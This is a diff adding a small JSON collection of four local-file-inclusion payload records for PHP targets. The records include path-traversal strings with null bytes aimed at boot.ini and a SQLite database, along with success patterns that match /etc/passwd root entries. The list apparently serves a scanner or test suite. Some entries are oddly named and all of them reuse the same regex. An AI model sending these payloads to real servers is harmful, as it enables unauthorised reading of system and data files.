@@ -1,0 +1,46 @@
+[
+  {
+    "payload_id": "OWP-58059",
+    "vulnerability_category": "Injection (LFI/RFI)",
+    "target_technology": "PHP",
+    "injection_point": "header",
+    "payload_string": "../../../hack_www/htdocs/hack",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:.*:0:0|boot.ini"
+    }
+  },
+  {
+    "payload_id": "OWP-58873",
+    "vulnerability_category": "Injection (LFI/RFI)",
+    "target_technology": "PHP",
+    "injection_point": "header",
+    "payload_string": "../../../../boot.ini\u0000",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:.*:0:0|boot.ini"
+    }
+  },
+  {
+    "payload_id": "OWP-58874",
+    "vulnerability_category": "Injection (LFI/RFI)",
+    "target_technology": "PHP",
+    "injection_point": "header",
+    "payload_string": "../db/budget.sqlite\u0000",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:.*:0:0|boot.ini"
+    }
+  },
+  {
+    "payload_id": "OWP-60380",
+    "vulnerability_category": "Injection (LFI/RFI)",
+    "target_technology": "PHP",
+    "injection_point": "header",
+    "payload_string": "projects/imageview",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:.*:0:0|boot.ini"
+    }
+  }
+]
